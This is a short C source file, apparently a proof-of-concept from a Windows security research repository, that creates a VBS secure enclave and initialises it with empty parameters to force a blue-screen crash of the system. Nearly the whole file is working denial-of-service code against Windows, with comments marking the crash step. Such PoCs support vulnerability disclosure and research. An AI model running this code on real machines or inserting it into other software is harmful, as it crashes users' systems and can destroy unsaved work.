/**
* @file        bsod.c
* @date        20-05-2021
* @author      Paul L. (@am0nsec)
* @version     1.0
* @brief       Microsoft Windows VBS Secure Enclave Denial of Service (DoS) Proof of Concept (PoC). 
* @link        https://github.com/am0nsec/wspe
*/
#include <Windows.h>
#include <stdio.h>

int main() {
	// 1. Check that the system supports VBS secure enclaves
	if (!IsEnclaveTypeSupported(ENCLAVE_TYPE_VBS)) {
		printf("[-] VBS secure enclave not supported.\n\n");
		return EXIT_FAILURE;
	}
	printf("[+] VBS secure enclave supported.\n");

	// 2. Create an Enclave.
	// 2097152 == 2Mb which is the minimum size working
	ENCLAVE_CREATE_INFO_VBS EnclaveCreateInfo = { 0x00 };
	LPVOID lpEnclaveAddress = CreateEnclave(
		(HANDLE)-1,
		NULL,
		2097152,
		0,
		ENCLAVE_TYPE_VBS,
		&EnclaveCreateInfo,
		sizeof(ENCLAVE_CREATE_INFO_VBS),
		NULL
	);
	if (lpEnclaveAddress == NULL) {
		printf("[-] Unable to create VBS secure enclave: %d\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] VBS secure enclave created: 0x%p\n", lpEnclaveAddress);

	// 3. Initialise enclave to BSOD the system.
	ENCLAVE_INIT_INFO_VBS EnclaveInitInfo = { 0x00 };
	InitializeEnclave(
		(HANDLE)-1,
		lpEnclaveAddress,
		&EnclaveInitInfo,
		sizeof EnclaveInitInfo,
		NULL
	);

	// 4. Exit the process.
	printf("[+] System has not BSOD!\n\n");
	return EXIT_SUCCESS;
}
